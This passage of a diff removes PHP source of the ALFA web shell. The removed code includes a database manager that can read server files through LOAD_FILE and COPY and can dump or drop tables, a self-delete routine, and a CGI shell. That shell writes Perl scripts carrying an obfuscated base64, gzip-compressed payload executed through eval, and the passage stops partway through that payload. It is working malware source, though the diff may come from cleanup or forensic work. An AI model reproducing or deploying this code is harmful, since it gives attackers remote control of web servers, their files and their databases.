-public $mysqli_connect_error = false;
-public $mysqli_connect_error_msg = "";
-function __construct($type){
-$this->type = $type;
-}
-function connect($host, $user, $pass, $dbname){
-switch($this->type){
-case 'mysql':
-if($this->link = @mysqli_connect($host,$user,$pass,$dbname)){
-	return true;
-}else{
-	$this->mysqli_connect_error = true;
-	$this->mysqli_connect_error_msg = mysqli_connect_error();
-	return false;
-}
-break;
-case 'pgsql':
-$host = explode(':', $host);
-if(!$host[1]) $host[1]=5432;
-if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
-break;
-}
-return false;
-}
-function selectdb($db){
-switch($this->type){
-case 'mysql':
-if(@mysqli_select_db($db))return true;
-break;
-}
-return false;
-}
-function query($str){
-switch($this->type){
-case 'mysql':
-return $this->res = @mysqli_query($this->link,$str);
-break;
-case 'pgsql':
-return $this->res = @pg_query($this->link,$str);
-break;
-}
-return false;
-}
-function fetch(){
-$res = func_num_args()?func_get_arg(0):$this->res;
-switch($this->type){
-case 'mysql':
-return @mysqli_fetch_assoc($res);
-break;
-case 'pgsql':
-return @pg_fetch_assoc($res);
-break;
-}
-return false;
-}
-function listDbs(){
-switch($this->type){
-case 'mysql':
-return $this->query("SHOW databases");
-break;
-case 'pgsql':
-return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
-break;
-}
-return false;
-}
-function listTables(){
-switch($this->type){
-case 'mysql':
-return $this->res = $this->query('SHOW TABLES');
-break;
-case 'pgsql':
-return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
-break;
-}
-return false;
-}
-function error(){
-switch($this->type){
-case 'mysql':
-return @mysqli_error($this->link);
-break;
-case 'pgsql':
-return @pg_last_error();
-break;
-}
-return false;
-}
-function setCharset($str){
-switch($this->type){
-case 'mysql':
-if(function_exists('mysql_set_charset'))
-return @mysqli_set_charset($this->link,$str);
-else
-$this->query('SET CHARSET '.$str);
-break;
-case 'pgsql':
-return @pg_set_client_encoding($this->link, $str);
-break;
-}
-return false;
-}
-function loadFile($str){
-switch($this->type){
-case 'mysql':
-return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
-break;
-case 'pgsql':
-$this->query("CREATE TABLE solevisible(file text);COPY solevisible FROM '".addslashes($str)."';select file from solevisible;");
-$r=array();
-while($i=$this->fetch())
-$r[] = $i['file'];
-$this->query('drop table solevisible');
-return array('file'=>implode("\n",$r));
-break;
-}
-return false;
-}
-};
-$db = new DbClass($_POST['type']);
-alfahead();
-$form_visibility = "table";
-if(isset($_POST['sql_host'])){
-	$connection_db = $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
-	if($connection_db && !empty($_POST['sql_base'])){
-		$form_visibility = "none";
-	}
-}
-$database_list = array();
-echo "
-<div class='header' style='min-height:300px;'>".($form_visibility!="none"?"<center><div class='txtfont_header'>| Sql Manager |</div><p>".getConfigHtml('all')."</p></center><div style='text-align:center;margin-bottom: 10px;'><button class='connection-his-btn db-opt-id' onclick='alfaShowConnectionHistory(this);' mode='on'>Connection History</button><div class='connection_history_holder'></div></div>":"")."
-<div class='sf' class='db-opt-id'><table style='margin: 0 auto;".($form_visibility=="none"?"display:none;":"")."' cellpadding='2' cellspacing='0'><tr>
-<td><div class=\"txtfont\">TYPE</div></td><td><div class=\"txtfont\">HOST</div></td><td><div class=\"txtfont\">DB USER</div></td><td><div class=\"txtfont\">DB PASS</div></td><td><div class=\"txtfont\">DB NAME</div></td><td></td></tr><tr>
-<td><select name='type'><option value='mysql' selected>mysql</option></select></td>
-<td><input type='text' name='sql_host' id='db_host' value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."'></td>
-<td><input type='text' name='sql_login' id='db_user' value='". (empty($_POST['sql_login'])?'':htmlspecialchars($_POST['sql_login'])) ."'></td>
-<td><input type='text' name='sql_pass' id='db_pw' value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'></td><td>";
-$tmp = "<input type='text' name='sql_base' id='db_name' value='". (empty($_POST['sql_base'])?'':htmlspecialchars($_POST['sql_base'])) ."'>";
-if(isset($_POST['sql_host'])){
-if($connection_db){
-$db->setCharset('utf8');
-$db->listDbs();
-echo "<select name=sql_base><option value=''></option>";
-while($item = $db->fetch()) {
-list($key, $value) = each($item);
-$database_list[] = $value;
-echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
-}
-echo '</select>';
-}else{
-	echo $tmp;
-}
-}else
-echo $tmp;
-$curr_mysql_id = $_POST['current_mysql_id'];
-echo "</td>
-<td><button onclick='fs(this);return false;' class='db-opt-id db-connect-btn'>Connect</button></td>
-<td><input type='checkbox' name='sql_count' value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> <div class=\"txtfont\">count the number of rows</div></td>
-</tr>
-</table>";
-if($db->mysqli_connect_error){
-	echo '<div style="text-align: center;font-size: 17px;margin-top: 18px;">'.$db->mysqli_connect_error_msg.'</div>';
-}
-if(!empty($curr_mysql_id)){
-	$sql_title_db = "";
-	if(!empty($_POST['sql_base'])){
-		$sql_title_db = "d.querySelector('#tab_".$curr_mysql_id." span').innerHTML='".addslashes($_POST['sql_base'])."';";
-	}
-	echo "<script>mysql_cache['".$curr_mysql_id."']['host']='".addslashes($_POST['sql_host'])."';mysql_cache['".$curr_mysql_id."']['user']='".addslashes($_POST['sql_login'])."';mysql_cache['".$curr_mysql_id."']['pass']='".addslashes($_POST['sql_pass'])."';mysql_cache['".$curr_mysql_id."']['db']='".addslashes($_POST['sql_base'])."';mysql_cache['".$curr_mysql_id."']['charset']='".addslashes($_POST['charset'])."';mysql_cache['".$curr_mysql_id."']['type']='".addslashes($_POST['type'])."';mysql_cache['".$curr_mysql_id."']['count']='".addslashes($_POST['sql_count'])."';".$sql_title_db."alfaConnectionHistoryUpdate();</script>";
-}
-if(isset($db) && $db->link){
-if(!empty($_POST['sql_base'])){
-echo "<div class='mysql-main'><div mode='block' onclick='alfaMysqlTablePanelCtl(this);' class='tables-panel-ctl db-opt-id'>&#x3C;&#x3C;</div><div class='mysql-tables'><div><input placeholder=\"Filter Table\" style='padding: 0;margin-left: 11px;text-align:center;' type='text' name='filter_all'><button class='db-opt-id' onclick='alfaMysqlFilterAllTable(this);return false;'>Search</button></div><div class='block'><a sql_count='".(empty($_POST['sql_count'])?"false":"true")."' mode='closed' onclick='alfaMysqlFilterAllTable(this,true);' class='expander parent-expander db-opt-id' href='javascript:void(0);'><img src='http://solevisible.com/icons/menu/b_plus.png' title='Expand/Collapse All DataBases' alt='Expand/Collapse All DataBases'></a></div><ul style='margin-top: 28px;'>";
-foreach ($database_list as $db_name) {
-	echo '<li><div class="block"><i></i><b></b><a sql_count="'.(empty($_POST['sql_count'])?"false":"true").'" db_target="'.$db_name.'" onclick="alfaMysqlExpander(this);" class="expander cls-'.$db_name.'-expander db-opt-id" href="javascript:void(0);"><img src="http://solevisible.com/icons/menu/'.($db_name == $_POST['sql_base']?"b_minus.png":"b_plus.png").'" title="Expand/Collapse" alt="Expand/Collapse"></a></div><span class="db_name">'.$db_name.'</span><div class="clearfloat"></div><div db_name="'.$db_name.'" mode="'.($db_name == $_POST['sql_base']?"loaded":"no").'" class="list_container cls-'.$db_name.'"><div>';
-	if($db_name == $_POST['sql_base']){
-		$db->selectdb($_POST['sql_base']);
-		$tbls_res = $db->listTables();
-		echo '<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" target=".cls-'.$db_name.'" placeholder="Filter Table" onkeyup="alfaMysqlFilterTable(this);" name="filter"></div></li>';
-		while($item = $db->fetch($tbls_res)){
-		list($key, $value) = each($item);
-		if(!empty($_POST['sql_count']))
-		$n = $db->fetch($db->query('SELECT COUNT(*) as n FROM `'.$value.'`'));
-		$value = htmlspecialchars($value);
-		echo "<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a class='db-opt-id' db_target='".$db_name."' href='javascript:void(0);' onclick=\"alfaLoadTableData(this,'".$value."')\"><span class='mysql_tables' style='font-weight:unset;'>".$value."</span></a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small><span style='font-weight:unset;' class='mysql_table_count'>({$n['n']})</span></small>") . "</div></li>";
-		}
-		echo '</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="alfaMysqlTablesEvil(this);" class="db-opt-id" target=".cls-'.$db_name.'" type="checkbox" class="db-opt-id"><select onchange="alfaMysqlTablesDumpDrop(this);" class="db-opt-id" target=".cls-'.$db_name.'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="alfaMysqlTablesDumpDropBtn(this);return false;" class="db-opt-id" db_target="'.$db_name.'" target=".cls-'.$db_name.'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>';
-	}
-	echo "</div></li>";
-}
-echo "</ul></div><div class='mysql-query-results'><div class='mysql-query-result-tabs'><div class='db-opt-id mysql-query-selected-tab' target='.mysql-query-result-content' onclick='alfaMysqlTabCtl(this);'>Result</div><div class='db-opt-id' target='.mysql-query-form' onclick='alfaMysqlTabCtl(this);'>Query</div><div class='db-opt-id' target='.mysql-search-area' onclick='alfaMysqlTabCtl(this);'>Search</div><div class='db-opt-id' target='.mysql-structure' onclick='alfaMysqlTabCtl(this);'>Structure</div><div class='db-opt-id' target='.mysql-insert-row' onclick='alfaMysqlTabCtl(this);'>Insert</div><div style='display:none;' class='db-opt-id' target='.mysql-edit-row' onclick='alfaMysqlTabCtl(this);'>Edit</div></div><div class='mysql-query-content mysql-insert-row mysql-hide-content'></div><div class='mysql-query-content mysql-edit-row mysql-hide-content'></div><div class='mysql-query-content mysql-search-area mysql-hide-content'></div><div class='mysql-query-content mysql-structure mysql-hide-content'></div><div class='mysql-query-content mysql-query-form mysql-hide-content'><div style='margin-bottom: 5px;'><span>Query:</span></div><textarea name='query' style='width:90%;height:100px'></textarea><p><div style='float:left;margin-left: 30px;'><input class='button db-opt-id' db_target='".$_POST['sql_base']."' onclick='alfaMysqlQuery(this);return false;' type='submit' value=' '></div></p></div><div class='mysql-query-content mysql-query-result-content'><div class='mysql-query-result-header'><div style='margin-bottom: 10px;' class='mysql-query-reporter'></div><div class='mysql-query-pager'></div></div><div class='mysql-query-table'></div></div></form></td></tr>";
-}
-echo "</table></div>";
-echo "</div>";
-}else{
-echo htmlspecialchars($db->error());
-}
-echo '</div>';
-alfafooter();
-}
-function alfaSql_manager_api(){
-	$db = $_POST["alfa1"];
-	$type = $_POST["alfa2"];
-	$sql_count = $_POST["alfa3"] == "true" ? true : false;
-	$db = @json_decode($db, true);
-	$conn = @mysqli_connect($db["host"], $db["user"], $db["pass"], $db["db"]);
-	@mysqli_set_charset($conn, "utf8");
-	if($conn){
-		if($type == "load_all_tables"){
-			$tables = array();
-			$q_tables = @mysqli_query($conn, "SELECT `table_schema`, `table_name` FROM `information_schema`.`tables` WHERE `table_schema` IN ('".implode("','", $db["databases"])."');");
-			$count = 0;
-			while($row = @mysqli_fetch_assoc($q_tables)){
-				if($sql_count){
-					$count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row["table_schema"].'`.`'.$row["table_name"].'`');
-					if($count_q){
-						$count = @mysqli_fetch_row($count_q);
-						$count = $count[0];
-					}
-				}
-				$tables[$row["table_schema"]][] = array("name" => $row["table_name"], "count" => (int)$count);
-			}
-			foreach($db["databases"] as $db){
-				if(!isset($tables[$db])){
-					$tables[$db] = null;
-				}
-			}
-			echo @json_encode($tables);
-		}elseif($type == "dump_drop"){
-			if($db["mode"] == "drop"){
-				foreach ($db["tables"] as $table) {
-					@mysqli_query($conn, "DROP TABLE `".$table."`;");
-				}
-				$tables = array();
-				$q_tables = @mysqli_query($conn, "SHOW TABLES;");
-				$count = 0;
-				while($row = @mysqli_fetch_array($q_tables)){
-					if($sql_count){
-						$count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row[0].'`');
-						if($count_q){
-							$count = @mysqli_fetch_row($count_q);
-							$count = $count[0];
-						}
-					}
-					$tables[] = array("name" => $row[0], "count" => (int)$count);
-				}
-				echo @json_encode($tables);
-			}else{
-				if(strlen(alfaEx("mysqldump"))>0){
-					alfaEx("mysqldump --single-transaction --host=\"".$db["host"]."\" --user=\"".$db["user"]."\" --password=\"".$db["pass"]."\" ".$db["db"]." ".implode(" ", $db["tables"])."  > ".$db["dump_file"]);
-				}else{
-					$fp = @fopen($db["dump_file"], "w");
-					foreach ($db["tables"] as $table) {
-						$res = @mysqli_query($conn, 'SHOW CREATE TABLE `'.$table.'`');
-						$create = @mysqli_fetch_array($res);
-						$sql = "DROP TABLE IF EXISTS `".$table."`;\n" . $create[1].";\n";
-						if($fp) fwrite($fp, $sql); else echo($sql);
-						$tbl_data = @mysqli_query($conn, 'SELECT * FROM `'.$table.'`');
-						$head = true;
-						while($item = @mysqli_fetch_assoc($tbl_data)){
-							$columns = array();
-							foreach($item as $k=>$v) {
-							if($v == null)
-							$item[$k] = "''";
-							elseif(is_numeric($v))
-							$item[$k] = $v;
-							else
-							$item[$k] = "'".@mysqli_real_escape_string($conn, $v)."'";
-							$columns[] = "`".$k."`";
-							}
-							if($head) {
-							$sql = 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')';
-							$head = false;
-							} else
-							$sql = "\n\t,(".implode(", ", $item).')';
-							if($fp) fwrite($fp, $sql); else echo($sql);
-						}
-						if(!$head)
-							if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
-					}
-				}
-				echo @json_encode(array("status" => true, "file" => $db["dump_file"]));
-			}
-		}elseif($type == "load_tables"){
-			$tables = array();
-			$q_tables = @mysqli_query($conn, "SHOW TABLES;");
-			$count = 0;
-			while($row = @mysqli_fetch_array($q_tables)){
-				if($sql_count){
-					$count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row[0].'`');
-					if($count_q){
-						$count = @mysqli_fetch_row($count_q);
-						$count = $count[0];
-					}
-				}
-				$tables[] = array("name" => $row[0], "count" => (int)$count);
-			}
-			echo @json_encode($tables);
-		}elseif($type == "alter"){
-			$db["alter"]["type"] = strtolower($db["alter"]["type"]);
-			$inputs = $db["alter"]["type"]."(".$db["alter"]["input"].")";
-			$text_input = array("longtext", "text", "mediumtext", "tinytext");
-			if(in_array($db["alter"]["type"], $text_input)){
-				$inputs = $db["alter"]["type"];
-			}
-			@mysqli_query($conn, "ALTER TABLE `".$db["table"]."` MODIFY COLUMN `".$db["column"]."` " . $inputs);
-			$error = @mysqli_error($conn);
-			if($error){
-				echo $error;
-			}else{
-				echo "ok";
-			}
-		}elseif($type == "edit" || $type == "delete" || $type == "delete_all"){
-			if($type == "edit"){
-				$q = @mysqli_query($conn, "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` WHERE `".$db["col_key"]."` = '".addslashes($db["key"])."' LIMIT 0,1");
-				$row = @mysqli_fetch_assoc($q);
-				if($row){
-					$columns_query = @mysqli_query($conn, "SELECT COLUMN_NAME as name, COLUMN_TYPE, DATA_TYPE as type FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$db["db"]."' AND `TABLE_NAME` = '".$db["table"]."'");
-					$columns = array();
-					$edit_data = array();
-					while($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
-						$input = array("col_type" => $row2["COLUMN_TYPE"]);
-						$row2["type"] = strtolower($row2["type"]);
-						switch($row2["type"]){
-							case "longtext": case "text": case "mediumtext": case "tinytext":
-								$input["tag"] = "textarea";
-							break;
-							case "int": case "smallint": case "bigint": case "tinyint": case "mediumint":
-								$input["tag"] = "input";
-								$input["type"] = "number";
-							break;
-							default:
-								$input["tag"] = "input";
-								$input["type"] = "text";
-						}
-						$columns[$row2["name"]] = $input;
-					}
-					foreach($row as $key => $v){
-						$edit_data[] = array("col" => $key, "value" => htmlspecialchars($v, ENT_QUOTES, 'UTF-8'), "type" => $columns[$key]);
-					}
-					echo @json_encode($edit_data);
-				}
-			}else{
-				if($type == "delete_all"){
-					$rows = implode("', '", $db["rows"]);
-				}else{
-					$rows = addslashes($db["key"]);
-				}
-				$query = "DELETE FROM `".$db["db"]."`.`".$db["table"]."` WHERE `".$db["col_key"]."` IN ('".$rows."')";
-				@mysqli_query($conn, $query);
-				$error = @mysqli_error($conn);
-				if($error){
-				 	$status = false;
-				}else{
-				 	$status = true;
-				}
-				echo @json_encode(array("status" => $status, "error" => $error, "query" => $query));
-			}
-		}elseif($type == "update"){
-			$query= "UPDATE `".$db["db"]."`.`".$db["table"]."` SET ";
-			foreach($db["data"] as $col => $val){
-				$query .= "`".$col."` = '".mysqli_real_escape_string($conn, $val)."',";
-			}
-			$query = substr($query, 0, -1);
-		    $query .= "WHERE `".$db["col_key"]."` = '".$db["key"]."'";
-			$res = @mysqli_query($conn, $query);
-			echo @json_encode(array("status" => $res, "error" => @mysqli_error($conn)));
-		}elseif($type == "insert"){
-			$query = "INSERT INTO `".$db["db"]."`.`".$db["table"]."` ";
-			foreach($db["data"] as $col => $val){
-				$cols .= $col . ",";
-				$vals .= "'".mysqli_real_escape_string($conn, $val)."',";
-			}
-			$cols = substr($cols, 0, -1);
-			$vals = substr($vals, 0, -1);
-			$query = $query . "(" . $cols . ")" . "VALUES(" . $vals . ")";
-			$res = @mysqli_query($conn, $query);
-			echo @json_encode(array("status" => $res, "error" => @mysqli_error($conn)));
-		}else{
-			$pages = 0;
-			$title = false;
-			$query = "";
-			$tbl_content = '<table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
-			$line = 0;
-			$tables = array();
-			$columns = array();
-			if($type == "load_data"){
-				$query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` LIMIT 0,30";
-				$tbl_count_q = @mysqli_query($conn, "SELECT COUNT(*) FROM `".$db["db"]."`.`".$db["table"]."`");
-				$tbl_count = @mysqli_fetch_row($tbl_count_q);
-				$columns_query = @mysqli_query($conn, "SELECT COLUMN_NAME as name, COLUMN_TYPE as type, COLLATION_NAME as collation, DATA_TYPE as data_type, CHARACTER_MAXIMUM_LENGTH as type_value FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$db["db"]."' AND `TABLE_NAME` = '".$db["table"]."'");
-				while($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
-					$columns[] = $row2;
-				}
-				if($tbl_count[0] > 30){
-					$pages = ceil($tbl_count[0] / 30);
-				}
-			}elseif($type == "query"){
-				$query = $db["query"];
-			}elseif($type == "page"){
-				$db["page"] = (int)$db["page"] - 1;
-				$query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` LIMIT ".($db["page"]*30).",30";
-			}elseif($type == "search"){
-				$search = "";
-				$search_noval = array("= ''", "!= ''", "IS NULL", "IS NOT NULL");
-				foreach($db["search"] as $col => $val){
-					$search_noval_r = in_array($val["opt"], $search_noval);
-					if(empty($val["value"]) && !$search_noval_r)continue;
-					if(strstr($val["opt"], "...") || $search_noval_r){
-						$val["opt"] = str_replace("...", $val["value"], $val["opt"]);
-						$search .= $col . " " . $val["opt"] . " AND ";
-					}else{
-						$search .= $col . " " . $val["opt"] . " '".addslashes($val["value"])."' AND ";
-					}
-				}
-				$search .= "1=1";
-				$query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` WHERE " . $search;
-			}
-			$q_tables = @mysqli_query($conn, $query);
-			if(!$q_tables){
-				echo @json_encode(array("status" => false, "error" => @mysqli_error($conn), "query" => $query));
-				return false;
-			}
-			$col_key = @mysqli_query($conn, "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '".@addslashes($db["db"])."' AND TABLE_NAME = '".@addslashes($db["table"])."' AND COLUMN_KEY = 'PRI'");
-			if($col_key){
-				$col_key = @mysqli_fetch_row($col_key);
-				$col_key = $col_key[0];
-				if(!empty($col_key)){
-					$tbl_content = '<div style="margin-bottom:5px;margin-top:5px;"><button col_key="'.$col_key.'" tbl_name="'.$db["table"].'" db_id="'.$db["db_id"].'" 	db_target="'.$db["db"].'" onclick="alfaMysqlDeleteAllSelectedrows(this);return false;">Delete Selected Rows</button></div><table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
-				}
-			}else{
-				$col_key = false;
-			}
-			while($item = @mysqli_fetch_assoc($q_tables)){
-				if(!$title){
-					$tbl_content .= '<tr style="background-color:#305b8e;">';
-					if($col_key){
-						$tbl_content .= '<th style="width: 55px;text-align:center;"><input db_id="'.$db["db_id"].'" onchange="alfaMysqlTblSelectAll(this);" type="checkbox"></th><th style="width: 55px;text-align:center;">Edit</th><th style="width: 55px;text-align:center;">Delete</th>';
-					}
-					foreach($item as $key => $value){
-						$tbl_content .= '<th>'.$key.'</th>';
-					}
-					reset($item);
-					$title=true;
-					$tbl_content .= '</tr><tr>';
-				}
-
-				if($col_key){
-					$cacheMsg = '<td style="text-align:center;"><input row_id="'.$line.'" type="checkbox" name="tbl_rows_checkbox[]" value="'.$item[$col_key].'"></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" onclick="alfaMysqlEditRow(this, \'edit\');" style="color:#0acaa6;">Edit</a></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" row_id="'.$line.'" onclick="alfaMysqlEditRow(this, \'delete\');" style="color:#ff1e1e;">Delete</a></td>';
-				}
-				$tbl_content .= '<tr class="tbl_row tbl_row_l'.$line.'">'.$cacheMsg;
-				$line++;
-				foreach($item as $key => $value){
-					if($value == null){
-						$tbl_content .= '<td><i>null</i></td>';
-					}else{
-						$tbl_content .= '<td>'.nl2br(htmlspecialchars($value)).'</td>';
-				}
-				}
-				$tbl_content .= '</tr>';
-			}
-			$tbl_content .= '</table>';
-			if(!$title){
-				$tbl_content = "<div style='padding:5px;border:1px dashed;margin:10px;'>Table is empty...</div>";
-			}
-			echo @json_encode(array("status" => true, "table" => $tbl_content, "columns" => $columns, "pages" => $pages, "query" => $query));
-		}
-		@mysqli_close($conn);
-	}
-}
-function alfaselfrm(){
-if(isset($_POST['alfa1'])&&$_POST['alfa1']=='yes'){
-echo(__pre().'<center>');
-if(@unlink($GLOBALS['__file_path'])){
-echo('<b>Shell has been removed</i> :)</b>');
-}else{
-echo 'unlink error!';
-}
-echo('</center>');
-}
-if(isset($_POST['alfa1'])&&$_POST['alfa1']!='yes'){
-echo "<div class=header>";
-echo "
-<center><p><img src=\"http://solevisible.com/images/farvahar-iran.png\"></p>";
-echo '<p><div class="txtfont">Do you want to destroy me?!</div><a href=javascript:void(0) onclick="g(\'selfrm\',null,\'yes\');"> Yes</a>';
-echo '</p></center></div>';
-}
-}
-function alfacgishell(){
-alfahead();
-$div = "";
-alfaCreateParentFolder();
-@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
-if(!in_array($_POST['alfa1'],array('perl','py'))){
-$div = "</div>";
-echo '<div class=header><center><p><div class="txtfont_header">| CGI Shell |</div></p><h3><a href=javascript:void(0) onclick="runcgi(\'perl\')">| Perl | </a><a href=javascript:void(0) onclick="runcgi(\'py\');">| Python | </a>';
-}
-if(isset($_POST['alfa1'])&&in_array($_POST['alfa1'],array('perl','py'))){
-@mkdir('cgialfa',0755);
-@chdir('cgialfa');
-alfacgihtaccess('cgi');
-$name = $_POST['alfa1'].'.alfa';
-$perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;eval(Compress::Zlib::memGunzip(decode_base64("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